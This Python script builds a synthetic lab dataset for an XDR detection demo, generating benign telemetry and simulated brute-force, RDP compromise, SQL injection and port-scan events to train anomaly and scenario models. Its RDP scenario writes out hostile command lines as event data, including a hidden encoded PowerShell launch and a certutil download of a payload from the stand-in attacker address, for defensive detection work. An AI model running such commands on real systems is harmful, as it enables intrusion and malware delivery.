from __future__ import annotations

import argparse
import csv
import json
import os
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import uuid4

# Synthetic copy of the lab topology (all data is generated, never use it as evaluation results).
ATTACKER_IP = "10.10.10.50"
HOSTS = {"DEMO-PC-01": "10.10.20.100", "DEMO-PC-02": "10.10.20.101"}
WEB_HOST, WEB_IP, WEB_AGENT = "DEMO-WEB", "10.10.50.20", "demo-web"
DEMO_ASSETS = {
    "internal_networks": ["10.10.0.0/16"],
    "untrusted_networks": ["10.10.10.0/24"],
    "hosts": [{"host_id": host, "ips": [ip], "aliases": [host.lower()]} for host, ip in HOSTS.items()]
    + [{"host_id": WEB_HOST, "ips": [WEB_IP], "aliases": [WEB_AGENT]}],
}
BENIGN_IMAGES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "C:\\Windows\\System32\\SearchProtocolHost.exe",
]
DOMAINS = ["www.google.com", "login.microsoftonline.com", "github.com", "update.code.visualstudio.com"]


def _ts(moment: datetime) -> str:
    return moment.isoformat().replace("+00:00", "Z")


def edr(host: str, ts: datetime, event_type: str, data: dict) -> dict:
    return {"event_id": f"demo:{uuid4()}", "timestamp": _ts(ts), "event_type": event_type, "source": "edr",
            "host_id": host, "severity": "info",
            "raw": {"source": "sysmon", "event_type": event_type, "computer": host, "data": data, "demo": True}}


def wazuh(agent: str, ts: datetime, groups: list[str], description: str, level: int = 5,
          win: dict | None = None, srcip: str | None = None) -> dict:
    from collectors.wazuh import normalize_alert

    data = {"win": win} if win else {}
    if srcip:
        data["srcip"] = srcip
    return normalize_alert({"id": f"demo-{uuid4()}", "timestamp": _ts(ts), "agent": {"name": agent},
                            "rule": {"id": "0", "level": level, "groups": groups, "description": description},
                            "data": data, "demo": True})


def logon(agent: str, ts: datetime, ok: bool, logon_type: str = "3", ip: str = ATTACKER_IP) -> dict:
    if ok:
        return wazuh(agent, ts, ["windows", "authentication_success"], "Windows logon success", 3,
                     {"system": {"eventID": "4624"}, "eventdata": {"logonType": logon_type, "ipAddress": ip}})
    return wazuh(agent, ts, ["windows", "authentication_failed"], "Logon failure - Unknown user or bad password",
                 5, {"system": {"eventID": "4625"}, "eventdata": {"logonType": logon_type, "ipAddress": ip}})


def suricata(ts: datetime, signature: str, category: str, src: str, dst: str, severity: int = 2) -> dict:
    from collectors.suricata import normalize_eve_record

    return normalize_eve_record({"timestamp": _ts(ts), "event_type": "alert", "src_ip": src, "dest_ip": dst,
                                 "flow_id": random.getrandbits(48), "proto": "TCP",
                                 "alert": {"signature": signature, "category": category, "severity": severity}},
                                "demo-suricata")


def benign_window(rng: random.Random, host: str, start: datetime) -> list[dict]:
    at = lambda: start + timedelta(seconds=rng.randint(0, 299))  # noqa: E731
    events = []
    busy = rng.random() < 0.3
    for _ in range(rng.randint(0, 8 if busy else 3)):
        image = rng.choice(BENIGN_IMAGES)
        events.append(edr(host, at(), "process_create", {"Image": image, "CommandLine": f"\"{image}\" --type=renderer",
                                                          "ParentImage": "C:\\Windows\\explorer.exe"}))
    if rng.random() < 0.05:
        events.append(edr(host, at(), "process_create", {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe", "ParentImage": "C:\\Windows\\explorer.exe"}))
    for _ in range(rng.randint(0, 25 if busy else 6)):
        events.append(edr(host, at(), "network_connect", {
            "DestinationIp": rng.choice(["10.10.50.10", "142.250.4.100", "20.190.1.10", "140.82.112.3"]),
            "DestinationPort": rng.choice(["443", "443", "443", "80", "53"])}))
    for _ in range(rng.randint(0, 12 if busy else 3)):
        events.append(edr(host, at(), "dns_query", {"QueryName": rng.choice(DOMAINS)}))
    for _ in range(rng.randint(0, 6)):
        events.append(edr(host, at(), "file_create", {
            "TargetFilename": f"C:\\Users\\demo\\AppData\\Local\\Temp\\{uuid4().hex[:8]}.tmp"}))
    for _ in range(rng.randint(0, 4)):
        events.append(edr(host, at(), "registry_set", {"TargetObject": "HKCU\\Software\\Demo\\Settings\\Theme"}))
    # Identity/network noise of a normal network: logons, a typo now and then, informational IDS alerts.
    if rng.random() < 0.15:
        events.append(logon(host.lower(), at(), True, rng.choice(["2", "3", "3"]), "10.10.50.10"))
    if rng.random() < 0.03:
        events.append(logon(host.lower(), at(), False, "2", "127.0.0.1"))
    if rng.random() < 0.04:
        events.append(suricata(at(), "ET INFO Windows Update P2P activity", "Not Suspicious Traffic",
                               HOSTS[host], "13.107.4.50", 3))
    return events


# ------------------------------------------------------------------ attack scenarios

def bruteforce(rng: random.Random, host: str, start: datetime) -> list[dict]:
    events = [logon(host.lower(), start + timedelta(seconds=rng.uniform(0, 200)), False)
              for _ in range(rng.randint(20, 150))]
    events += [suricata(start + timedelta(seconds=rng.uniform(0, 200)),
                        "ET SCAN Behavioral Unusual Port 3389 traffic Potential Brute Force",
                        "Attempted Administrator Privilege Gain", ATTACKER_IP, HOSTS[host], 1)
               for _ in range(rng.randint(0, 4))]
    return events


def rdp_compromise(rng: random.Random, host: str, start: datetime) -> list[dict]:
    t = lambda s: start + timedelta(seconds=s)  # noqa: E731
    events = [logon(host.lower(), t(rng.uniform(0, 30)), False, "10") for _ in range(rng.randint(3, 10))]
    events.append(logon(host.lower(), t(40), True, "10"))
    commands = [("C:\\Windows\\System32\\rdpclip.exe", "rdpclip"), ("C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
                ("C:\\Windows\\System32\\whoami.exe", "whoami /all"), ("C:\\Windows\\System32\\net.exe", "net user"),
                ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
                ("C:\\Windows\\System32\\certutil.exe",
                 f"certutil -urlcache -split -f http://{ATTACKER_IP}/t.exe C:\\Users\\Public\\t.exe")]
    for i, (image, cmd) in enumerate(rng.sample(commands, rng.randint(4, len(commands)))):
        events.append(edr(host, t(60 + 10 * i), "process_create", {
            "Image": image, "CommandLine": cmd, "ParentImage": "C:\\Windows\\explorer.exe"}))
    if rng.random() < 0.7:
        events.append(edr(host, t(150), "registry_set", {
            "TargetObject": "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"}))
        events.append(edr(host, t(140), "file_create", {"TargetFilename": "C:\\Users\\Public\\t.exe"}))
    return events


def sql_injection(rng: random.Random, start: datetime) -> list[dict]:
    payloads = ["ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT",
                "ET WEB_SERVER SQL Injection Select Sleep Time Delay",
                "ET SCAN Sqlmap SQL Injection Scan"]
    events = [suricata(start + timedelta(seconds=rng.uniform(0, 240)), rng.choice(payloads),
                       "Web Application Attack", ATTACKER_IP, WEB_IP, 1) for _ in range(rng.randint(5, 80))]
    events += [wazuh(WEB_AGENT, start + timedelta(seconds=rng.uniform(0, 240)),
                     ["web", "accesslog", "attack", "sql_injection"], "SQL injection attempt.", 7,
                     srcip=ATTACKER_IP) for _ in range(rng.randint(3, 50))]
    return events


def port_scan(rng: random.Random, host: str, start: datetime) -> list[dict]:
    signatures = ["ET SCAN Nmap Scripting Engine User-Agent Detected", "ET SCAN Possible Nmap User-Agent Observed",
                  "ET SCAN Suspicious inbound to MSSQL port 1433", "ET SCAN Potential VNC Scan 5900-5920"]
    return [suricata(start + timedelta(seconds=rng.uniform(0, 120)), rng.choice(signatures),
                     "Attempted Information Leak", ATTACKER_IP, HOSTS[host], 2) for _ in range(rng.randint(5, 40))]


def run_scenario(rng: random.Random, scenario: str, start: datetime) -> tuple[str, list[dict]]:
    host = rng.choice(list(HOSTS))
    if scenario == "bruteforce":
        return host, bruteforce(rng, host, start)
    if scenario == "rdp_compromise":
        return host, rdp_compromise(rng, host, start)
    if scenario == "sql_injection":
        return WEB_HOST, sql_injection(rng, start)
    return host, port_scan(rng, host, start)


def main() -> None:
    parser = argparse.ArgumentParser(description="Create a synthetic demo of the lab: database, both AI models")
    parser.add_argument("--db", type=Path, default=Path("data/demo.sqlite3"))
    parser.add_argument("--model", type=Path, default=Path("data/demo_model.joblib"))
    parser.add_argument("--scenario-model", type=Path, default=Path("data/demo_scenarios.joblib"))
    parser.add_argument("--assets", type=Path, default=Path("data/demo_assets.json"))
    parser.add_argument("--hours", type=int, default=36, help="Hours of history to generate")
    parser.add_argument("--runs-per-scenario", type=int, default=12)
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # Windows consoles default to cp1252

    if args.db.exists():
        args.db.unlink()  # the demo database is always rebuilt from scratch
    args.assets.parent.mkdir(parents=True, exist_ok=True)
    args.assets.write_text(json.dumps(DEMO_ASSETS, indent=2), encoding="utf-8")
    os.environ.update({"XDR_DATABASE_PATH": str(args.db), "XDR_AI_MODEL_PATH": str(args.model),
                       "XDR_AI_SCENARIO_MODEL_PATH": str(args.scenario_model),
                       "XDR_AI_ASSETS_PATH": str(args.assets)})

    # Imported after the environment points at the demo files.
    from ai import train_scenarios
    from ai.analyzer import analyze_pending
    from ai.datasets import iter_db_events
    from ai.detector import save_model, train_model
    from ai.features import group_windows, window_features
    from database.database import db_session, init_db, save_event_with_alerts
    from ingestion import detect_event, load_detection_content

    init_db()
    rng = random.Random(args.seed)
    random.seed(args.seed)
    now = datetime.now(timezone.utc).replace(microsecond=0)
    current_window = now - timedelta(seconds=int(now.timestamp()) % 300)
    history_start = current_window - timedelta(hours=args.hours)
    baseline_end = history_start + timedelta(hours=args.hours // 2)     # first half: clean baseline
    live_start = current_window - timedelta(hours=2)                    # last 2 h: "live" traffic

    benign = []
    start = history_start
    while start < current_window - timedelta(minutes=5):
        for host in HOSTS:
            benign.extend(benign_window(rng, host, start))
        start += timedelta(minutes=5)

    # Labelled attack runs in the second half of the history (lab exercises, times written down).
    scenarios = ["bruteforce", "rdp_compromise", "sql_injection", "port_scan"]
    runs, attack_events = [], []
    slots = int((live_start - baseline_end).total_seconds() // 1200) - 1   # one run per 20 minutes
    order = [s for s in scenarios for _ in range(args.runs_per_scenario)]
    rng.shuffle(order)
    for index, scenario in enumerate(order[:slots]):
        run_start = baseline_end + timedelta(minutes=20 * index + 5, seconds=rng.randint(0, 60))
        host, events = run_scenario(rng, scenario, run_start)
        attack_events += events
        # Like the lab operator: write down when the attack started and when it finished.
        last = max(datetime.fromisoformat(e["timestamp"].replace("Z", "+00:00")) for e in events)
        runs.append({"run_id": f"{scenario}-{index:02d}", "scenario": scenario, "host": host,
                     "start": _ts(run_start), "end": _ts(last.replace(microsecond=0) + timedelta(seconds=1))})

    with db_session() as connection:
        connection.executemany(
            "INSERT INTO events (event_id, timestamp, event_type, source, host_id, severity, raw_json) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            [(e["event_id"], e["timestamp"], e["event_type"], e["source"], e["host_id"], e["severity"],
              json.dumps(e["raw"])) for e in benign + attack_events])

    # Tier 1: anomaly model on the clean first half only.
    training = list(iter_db_events(args.db, since=_ts(history_start)[:19], until=_ts(baseline_end)[:19]))
    bundle = train_model([window_features(e) for e in group_windows(training).values()], target_fpr=0.01)
    bundle.update(hosts=sorted(HOSTS), demo=True)
    save_model(bundle, args.model)

    # Tier 2: scenario classifier from the labelled runs, through the same CLI used in the lab.
    runs_file = args.db.with_name("demo_runs.csv")
    with open(runs_file, "w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=["run_id", "scenario", "host", "start", "end"])
        writer.writeheader()
        writer.writerows(runs)
    sys.argv = ["train_scenarios", "--db", str(args.db), "--runs", str(runs_file), "--out", str(args.scenario_model),
                "--benign-range", _ts(history_start), _ts(live_start),
                "--report", str(args.db.with_name("demo_scenarios_report.json"))]
    train_scenarios.main()

    # Live attack chain on PC-01 and SQL injection on the web server, then run the AI.
    rules, iocs = load_detection_content()
    live = (port_scan(rng, "DEMO-PC-01", current_window - timedelta(minutes=50))
            + bruteforce(rng, "DEMO-PC-01", current_window - timedelta(minutes=35))
            + rdp_compromise(rng, "DEMO-PC-01", current_window - timedelta(minutes=20))
            + sql_injection(rng, current_window - timedelta(minutes=25)))
    for event in live:
        save_event_with_alerts(event, detect_event(event, rules, iocs))
    result = analyze_pending(now=now, lookback_minutes=120, grace_seconds=60)

    print("\n=== DEMO READY (synthetic data, not for evaluation) ===")
    print(f"Benign events: {len(benign)} | labelled runs: {len(runs)} | live attack events: {len(live)}")
    print(f"Anomaly model {bundle['version']} on {bundle['training_windows']} windows -> {args.model}")
    print(f"AI run on the last 2 hours: {result}")
    print("\nStart the server on the demo files (PowerShell, in the backend folder):")
    print(f'  $env:XDR_DATABASE_PATH="{args.db}"; $env:XDR_AI_MODEL_PATH="{args.model}"; '
          f'$env:XDR_AI_SCENARIO_MODEL_PATH="{args.scenario_model}"; $env:XDR_AI_ASSETS_PATH="{args.assets}"; '
          '$env:XDR_AGENT_KEY="demo-agent-key"; '
          '$env:XDR_BOOTSTRAP_ADMIN_USERNAME="admin"; $env:XDR_BOOTSTRAP_ADMIN_PASSWORD="demo-password-123"')
    print("  ..\\.venv\\Scripts\\uvicorn main:app --port 8000")
    print("Then open http://127.0.0.1:8000/dashboard/ (admin / demo-password-123) and go to 'AI phát hiện'.")


if __name__ == "__main__":
    main()
